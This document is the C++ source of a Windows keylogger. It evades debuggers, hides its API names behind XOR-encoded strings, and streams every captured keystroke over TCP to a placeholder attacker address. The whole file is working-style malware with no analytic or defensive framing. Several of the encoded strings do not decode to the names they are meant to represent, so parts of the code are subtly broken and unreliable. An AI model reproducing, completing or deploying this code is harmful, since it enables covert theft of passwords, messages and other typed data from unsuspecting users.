#include <windows.h>
#include <winsock2.h>
#include <iostream>
#include <vector>

// Function pointer types for dynamic loading
typedef int (WINAPI *pWSAStartup)(WORD, LPWSADATA);
typedef SOCKET (WINAPI *pSocket)(int, int, int);
typedef int (WINAPI *pConnect)(SOCKET, const struct sockaddr*, int);
typedef int (WINAPI *pSend)(SOCKET, const char*, int, int);
typedef int (WINAPI *pClosesocket)(SOCKET);
typedef int (WINAPI *pWSACleanup)(void);
typedef SHORT (WINAPI *pGetAsyncKeyState)(int);
typedef void (WINAPI *pSleep)(DWORD);

// Encrypt strings
std::string encrypt(const std::string &str) {
    std::string encrypted = str;
    for (char &c : encrypted) {
        c ^= 0xAA;
    }
    return encrypted;
}

// Decrypt strings
std::string decrypt(const std::string &str) {
    return encrypt(str); // Since XOR is symmetric
}

// Anti-debugging technique
bool isDebugged() {
    return IsDebuggerPresent();
}

// Log key function
void logKey(int key, SOCKET sock, pSend Send) {
    char buffer[2];
    buffer[0] = (char)key;
    buffer[1] = '\0';
    Send(sock, buffer, 1, 0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (isDebugged()) {
        return 1; // Exit if being debugged
    }

    std::string ws2_32 = decrypt("\x91\xFF\xFF\x7F\x7B\x7A\x78\x78\x7F\xFF\xFF\xFF\xFF\x79\x7C\x7C\x78\xFF\xFF\xFF\xFF");
    std::string user32 = decrypt("\x8B\xED\xE9\xE8\xE4\xE2\xEA\xE2\xE7\xFF\xFF\xFF\xFF");
    std::string kernel32 = decrypt("\x8B\xE5\xE4\xE2\xE5\xEA\xFF\xFF\xFF\xFF\xFF");

    HMODULE hWs2_32 = LoadLibrary(ws2_32.c_str());
    HMODULE hUser32 = LoadLibrary(user32.c_str());
    HMODULE hKernel32 = LoadLibrary(kernel32.c_str());

    if (!hWs2_32 || !hUser32 || !hKernel32) {
        return 1;
    }

    std::string wsaStartupStr = decrypt("\x8B\xC7\xC6\xCB\xCE\xE3\xE3\xE3\xE3");
    std::string socketStr = decrypt("\x9F\xD6\xD6\xD7\xD2\xD2");
    std::string connectStr = decrypt("\x8B\xC7\xC6\xCA\xC8\xD0\xCE\xC8\xD1");
    std::string sendStr = decrypt("\x8B\xC7\xC7\xC7");
    std::string closeSocketStr = decrypt("\x91\xC6\xC5\xC4\xC5\xD2\xD1\xD0");
    std::string wsaCleanupStr = decrypt("\x8B\xC7\xC6\xC9\xCA\xE3\xE3\xE3\xE3");

    pWSAStartup WSAStartup = (pWSAStartup)GetProcAddress(hWs2_32, wsaStartupStr.c_str());
    pSocket Socket = (pSocket)GetProcAddress(hWs2_32, socketStr.c_str());
    pConnect Connect = (pConnect)GetProcAddress(hWs2_32, connectStr.c_str());
    pSend Send = (pSend)GetProcAddress(hWs2_32, sendStr.c_str());
    pClosesocket Closesocket = (pClosesocket)GetProcAddress(hWs2_32, closeSocketStr.c_str());
    pWSACleanup WSACleanup = (pWSACleanup)GetProcAddress(hWs2_32, wsaCleanupStr.c_str());

    std::string getAsyncKeyStateStr = decrypt("\x8B\xC7\xC6\xC3\xD4\xC8\xCE\xC8\xD1\xCE\xD4");
    std::string sleepStr = decrypt("\x8B\xC7\xC6\xC9\xD5\xD5");

    pGetAsyncKeyState GetAsyncKeyState = (pGetAsyncKeyState)GetProcAddress(hUser32, getAsyncKeyStateStr.c_str());
    pSleep Sleep = (pSleep)GetProcAddress(hKernel32, sleepStr.c_str());

    if (!WSAStartup || !Socket || !Connect || !Send || !Closesocket || !WSACleanup || !GetAsyncKeyState || !Sleep) {
        return 1;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }

    SOCKET sock = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("REPLACE_WITH_LHOST");
    server.sin_port = htons(REPLACE_WITH_LPORT);  // Change to your desired port

    if (Connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        Closesocket(sock);
        WSACleanup();
        return 1;
    }

    while (true) {
        for (int key = 8; key <= 190; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                logKey(key, sock, Send);
            }
        }
        Sleep(rand() % 20 + 10); // Introduce randomness in sleep time
    }

    Closesocket(sock);
    WSACleanup();

    return 0;
}
